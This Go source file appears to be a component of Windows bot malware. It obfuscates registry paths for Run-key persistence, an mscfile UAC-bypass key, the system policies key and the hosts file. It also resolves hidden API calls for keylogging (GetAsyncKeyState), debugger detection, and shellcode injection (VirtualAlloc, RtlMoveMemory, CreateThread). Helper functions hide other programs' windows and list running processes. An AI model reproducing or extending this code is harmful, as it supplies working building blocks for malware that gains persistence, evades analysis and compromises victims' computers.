package components

import (
	"bytes"
	"fmt"
	"math/rand"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/StackExchange/wmi"
)

type mMind struct {
	City struct {
		GeonameID int `json:"geoname_id"`
		Names     struct {
			En string `json:"en"`
			Ru string `json:"ru"`
		} `json:"names"`
	} `json:"city"`
	Continent struct {
		Code      string `json:"code"`
		GeonameID int    `json:"geoname_id"`
		Names     struct {
			Ja   string `json:"ja"`
			PtBR string `json:"pt-BR"`
			Ru   string `json:"ru"`
			ZhCN string `json:"zh-CN"`
			De   string `json:"de"`
			En   string `json:"en"`
			Es   string `json:"es"`
			Fr   string `json:"fr"`
		} `json:"names"`
	} `json:"continent"`
	Country struct {
		IsoCode   string `json:"iso_code"`
		GeonameID int    `json:"geoname_id"`
		Names     struct {
			ZhCN string `json:"zh-CN"`
			De   string `json:"de"`
			En   string `json:"en"`
			Es   string `json:"es"`
			Fr   string `json:"fr"`
			Ja   string `json:"ja"`
			PtBR string `json:"pt-BR"`
			Ru   string `json:"ru"`
		} `json:"names"`
	} `json:"country"`
	Location struct {
		AccuracyRadius int     `json:"accuracy_radius"`
		Latitude       float64 `json:"latitude"`
		Longitude      float64 `json:"longitude"`
		MetroCode      int     `json:"metro_code"`
		TimeZone       string  `json:"time_zone"`
	} `json:"location"`
	Postal struct {
		Code string `json:"code"`
	} `json:"postal"`
	Subdivisions []struct {
		IsoCode   string `json:"iso_code"`
		GeonameID int    `json:"geoname_id"`
		Names     struct {
			En   string `json:"en"`
			Es   string `json:"es"`
			Fr   string `json:"fr"`
			Ja   string `json:"ja"`
			PtBR string `json:"pt-BR"`
			Ru   string `json:"ru"`
			ZhCN string `json:"zh-CN"`
			De   string `json:"de"`
		} `json:"names"`
	} `json:"subdivisions"`
	Traits struct {
		AutonomousSystemNumber       int    `json:"autonomous_system_number"`
		AutonomousSystemOrganization string `json:"autonomous_system_organization"`
		Isp                          string `json:"isp"`
		Organization                 string `json:"organization"`
		IPAddress                    string `json:"ip_address"`
	} `json:"traits"`
}

type win32Process struct {
	Name           string
	ExecutablePath *string
}

type win32Product struct {
	Name *string
}

var (
	//============================================================
	//                   Dont Touch Bellow
	//============================================================

	runPath            = deobfuscate("Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Svo")             //Software\Microsoft\Windows\CurrentVersion\Run
	homepagePath       = deobfuscate("Tpguxbsf]]Njdsptpgu]]Joufsofu!Fyqmpsfs]]Nbjo")              //Software\Microsoft\Internet Explorer\Main
	systemPoliciesPath = deobfuscate("Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Qpmjdjft]Tztufn") //Software\Microsoft\Windows\CurrentVersion\Policies\System

	bypassPath    = deobfuscate("ILDV]]Tpguxbsf]]Dmbttft]]ntdgjmf]]tifmm]]pqfo]]dpnnboe") //HKCU\Software\Classes\mscfile\shell\open\command
	bypassPathAlt = deobfuscate("ILDV]]Tpguxbsf]]Dmbttft]]ntdgjmf")                       //HKCU\Software\Classes\mscfile

	hostFilePath = deobfuscate("Tztufn43]]esjwfst]]fud]]") //system32/drivers/etc/

	user32   = syscall.NewLazyDLL(deobfuscate("vtfs43/emm"))   //user32.dll
	kernel32 = syscall.NewLazyDLL(deobfuscate("lfsofm43/emm")) //kernel32.dll

	procMessageBoxW = user32.NewProc(deobfuscate("NfttbhfCpyX")) //MessageBoxW

	procGetAsyncKeyState = user32.NewProc(deobfuscate("HfuBtzodLfzTubuf")) //GetAsyncKeyState

	procCreateMutex = kernel32.NewProc(deobfuscate("DsfbufNvufyX")) //CreateMutexW

	procIsDebuggerPresent = kernel32.NewProc(deobfuscate("JtEfcvhhfsQsftfou")) //IsDebuggerPresent

	procGetForegroundWindow = user32.NewProc(deobfuscate("HfuGpsfhspvoeXjoepx")) //GetForegroundWindow
	procGetWindowTextW      = user32.NewProc(deobfuscate("HfuXjoepxUfyuX"))      //GetWindowTextW
	procShowWindow          = user32.NewProc(deobfuscate("TipxXjoepx"))          //ShowWindow
	procEnumWindows         = user32.NewProc(deobfuscate("FovnXjoepxt"))         //EnumWindows

	procSystemParametersInfoW = user32.NewProc(deobfuscate("TztufnQbsbnfufstJogpX")) //SystemParametersInfoW

	procVirtualAlloc        = kernel32.NewProc(deobfuscate("WjsuvbmBmmpd"))        //VirtualAlloc
	procRtlMoveMemory       = kernel32.NewProc(deobfuscate("SumNpwfNfnpsz"))       //RtlMoveMemory
	procCreateThread        = kernel32.NewProc(deobfuscate("DsfbufUisfbe"))        //CreateThread
	procWaitForSingleObject = kernel32.NewProc(deobfuscate("XbjuGpsTjohmfPckfdu")) //WaitForSingleObject
)

func newDebugUpdate(message string) {
	if len(message) > 0 {
		currentTime := time.Now().Local()
		fmt.Println("[", currentTime.Format(time.RFC1123Z), "] "+message)
	}
}

func hideProcWindow(exe string, active string) { //go components.HideProcWindow("Calculator")
	if active == "true" {
		for {
			time.Sleep(1 * time.Second)
			if checkForProc(exe) {
				_, _, err := procShowWindow.Call(uintptr(findWindow(exe)), uintptr(0))
				if err != nil {
				}
			}
		}
	} else {
		if checkForProc(exe) {
			_, _, err := procShowWindow.Call(uintptr(findWindow(exe)), uintptr(0))
			if err != nil {
			}
		}
	}
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func findWindow(title string) syscall.Handle {
	var hwnd syscall.Handle
	cb := syscall.NewCallback(func(h syscall.Handle, p uintptr) uintptr {
		b := make([]uint16, 200)
		_, err := getWindowText(h, &b[0], int32(len(b)))
		if err != nil {
			return 1
		}
		if strings.Contains(syscall.UTF16ToString(b), title) {
			hwnd = h
			return 0
		}
		return 1
	})
	enumWindows(cb, 0)
	if hwnd == 0 {
		return 0
	}
	return hwnd
}

func enumWindows(enumFunc uintptr, lparam uintptr) (err error) {
	r1, _, e1 := syscall.Syscall(procEnumWindows.Addr(), 2, uintptr(enumFunc), uintptr(lparam), 0)
	if r1 == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func checkForProc(proc string) bool {
	var dst []win32Process
	q := wmi.CreateQuery(&dst, "")
	err := wmi.Query(q, &dst)
	if err != nil {
		return false
	}
	for _, v := range dst {
		if bytes.Contains([]byte(v.Name), []byte(proc)) {
			return true
		}
	}
	return false
}

func messageBox(title, text string, style uintptr) (result int) {
	//NewDebugUpdate("Displaying MessageBox")
	ret, _, _ := procMessageBoxW.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(text))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		uintptr(style))
	result = int(ret)
	return
}

func randomString(strlen int, icint bool) string { //Generates a random string
	if icint != false {
		rand.Seed(time.Now().UTC().UnixNano())
		const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
		result := make([]byte, strlen)
		for i := 0; i < strlen; i++ {
			result[i] = chars[rand.Intn(len(chars))]
		}
		return string(result)
	}
	rand.Seed(time.Now().UTC().UnixNano())
	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
	result := make([]byte, strlen)
	for i := 0; i < strlen; i++ {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

func randInt(min int, max int) int {
	rand.Seed(time.Now().UTC().UnixNano())
	return min + rand.Intn(max-min)
}

func goToSleep(sleeptime int) { //Makes the bot sleep
	//NewDebugUpdate("Sleeping for " + string(sleeptime) + " Seconds...")
	time.Sleep(time.Duration(sleeptime) * time.Second)
}

func takeAMoment() {
	time.Sleep(time.Duration(randInt(250, 500)) * time.Millisecond)
}
